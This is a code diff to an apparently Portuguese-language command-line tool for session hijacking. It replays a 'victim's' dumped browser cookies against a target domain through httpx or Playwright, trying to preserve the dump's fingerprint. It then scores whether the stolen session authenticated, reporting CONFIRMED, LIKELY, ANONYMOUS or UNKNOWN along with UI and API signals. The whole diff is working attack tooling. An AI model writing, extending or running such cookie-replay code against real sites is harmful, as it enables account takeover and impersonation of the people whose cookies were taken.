@@ -274,11 +274,16 @@ def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
 @click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
               default="strict", show_default=True,
               help="Modo de replay (STRICT preserva fingerprint do dump).")
+@click.option("--max-wait-ms", type=int, default=8000, show_default=True,
+              help="Espera maxima por readiness da aplicacao (Playwright).")
 def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
-          req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
+          req_path: str, shot_dir: Path, allow_unsafe_scope: bool,
+          replay_mode: str, max_wait_ms: int):
     """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
     from .domain.matcher import applicable_cookies
-    from .validate.auth_state import detect
+    from .validate.auth_state import (detect_baseline_vs_injected as detect,
+                                    extract_evidence_state as _ev_state,
+                                    CONFIRMED, LIKELY, ANONYMOUS, UNKNOWN)
     from .validate.scoring import score_artifacts
     from .inject import httpx_client, playwright_client
     from .inject.capture import sent_cookie_names
@@ -313,7 +318,8 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
             res.setdefault("error", None)
             return res
         return playwright_client.replay(
-            target_url, with_cookies, screenshot_path=shot_path, mode=replay_mode
+            target_url, with_cookies, screenshot_path=shot_path,
+            mode=replay_mode, max_wait_ms=max_wait_ms,
         )
 
     # Baseline (sem cookies).
@@ -325,7 +331,16 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
     if not _verify_effective_urls(injected, scope_util, allow_unsafe_scope):
         return
 
-    result = detect(baseline, injected, host)
+    if baseline.get("evidence") and injected.get("evidence"):
+        result = detect(
+            baseline_evidence=baseline["evidence"],
+            injected_evidence=injected["evidence"],
+            domain=host,
+        )
+    else:
+        # Canal httpx (sem probe estruturado): usa detector por markers.
+        from .validate.auth_state import detect_from_summary
+        result = detect_from_summary(baseline, injected, host)
     sent_names = sent_cookie_names(injected)
     artifacts = score_artifacts(sent_names, cookies)
 
@@ -333,11 +348,14 @@ def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
     from .report import json_out
     evidence_blob = json_out.dumps({
         "state": result["state"], "confidence": result["confidence"],
-        "profile": result["profile"], "evidence": result["evidence"],
+        "profile": result["profile"],
+        "differential": result.get("differential") or {},
+        "baseline_evidence": result.get("baseline") or {},
+        "injected_evidence": result.get("injected") or {},
         "baseline": {k: baseline.get(k) for k in
-                     ("status", "final_url", "title")},
+                     ("status_code", "final_url", "title")},
         "injected": {k: injected.get(k) for k in
-                      ("status", "final_url", "title")},
+                      ("status_code", "final_url", "title", "evidence")},
     })
     run_id = store.record_run(victim, target_url, host, channel,
                               state=result["state"],
@@ -373,19 +391,63 @@ def _tri_label(value):
 
 
 def _print_check_result(result, sent_names, artifacts, injected):
+    from .validate.auth_state import (
+        CONFIRMED as _C, LIKELY as _L, ANONYMOUS as _A, UNKNOWN as _U,
+    )
     state = result["state"]
     color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
              "UNKNOWN": "yellow"}.get(state, "yellow")
     console.print(f"\n[bold {color}]{state}[/] (confianca {result['confidence']:.2f}, perfil {result['profile']})")
 
-    ev = result["evidence"]
-    console.print(f"  baseline status={ev.get('status_baseline')} | injetado status={ev.get('status_injected')}")
+    ev = result.get("evidence") or {}
+    inj_ev = ev.get("injected_evidence") or result.get("injected") or {}
+    base_ev = ev.get("baseline_evidence") or result.get("baseline") or {}
+    differential = result.get("differential") or {}
+
+    if state == _U:
+        if injected.get("error"):
+            console.print(f"  [yellow]UNKNOWN_REASON[/]: replay error: {injected.get('error')}")
+        elif not inj_ev and not base_ev:
+            console.print("  [yellow]UNKNOWN_REASON[/]: cliente httpx (sem probe estruturado)")
+        elif inj_ev.get("console_errors"):
+            console.print("  [yellow]UNKNOWN_REASON[/]: frontend JS errors (ver console_errors)")
+        elif inj_ev.get("request_failures"):
+            console.print("  [yellow]UNKNOWN_REASON[/]: request failures (ver request_failures)")
+        else:
+            console.print("  [yellow]UNKNOWN_REASON[/]: sem diferenca significativa (cookies aceitos mas UI/API nao distinguem baseline de injetado)")
+
+    if inj_ev and (inj_ev.get("api_authenticated") or inj_ev.get("api_user_id_present")
+                    or inj_ev.get("authenticated_ui") or inj_ev.get("login_redirect")):
+        sig = []
+        if inj_ev.get("api_authenticated"):
+            sig.append("api_auth")
+        if inj_ev.get("api_user_id_present"):
+            sig.append("api_user_id")
+        if inj_ev.get("authenticated_ui"):
+            sel = inj_ev.get("authenticated_selectors", [])
+            sig.append("ui_auth:" + ",".join(sel[:2]) if sel else "ui_auth")
+        if inj_ev.get("login_redirect"):
+            sig.append("login_redirect")
+        console.print(f"  sinais injetado: {' | '.join(sig)}")
+
+    if inj_ev.get("console_errors"):
+        console.print(f"  console errors: {len(inj_ev['console_errors'])}")
+    if inj_ev.get("request_failures"):
+        console.print(f"  request failures: {len(inj_ev['request_failures'])}")
+
+    if differential:
+        bits = []
+        for k, v in differential.items():
+            if k == "body_length_delta":
+                bits.append(f"body_delta={v}")
+            elif isinstance(v, dict):
+                bits.append(f"{k}: base={v['baseline']} inj={v['injected']}")
+        console.print(f"  diferencial: {' | '.join(bits)}")
+
+    if ev.get("status_baseline") is not None:
+        console.print(f"  baseline status={ev.get('status_baseline')} | injetado status={ev.get('status_injected')}")
     if ev.get("injected_markers"):
         console.print(f"  markers injetado: {', '.join(ev['injected_markers'])}")
-    identity = ev.get("identity_injected") or {}
-    if identity:
-        ids = ", ".join(f"{k}={v}" for k, v in identity.items())
-        console.print(f"  [bold]identidade[/]: {ids}")
     chain = ev.get("redirect_chain") or []
     if chain:
         chain_s = " -> ".join(f"{c['status']} {c['url']}" for c in chain[:5])
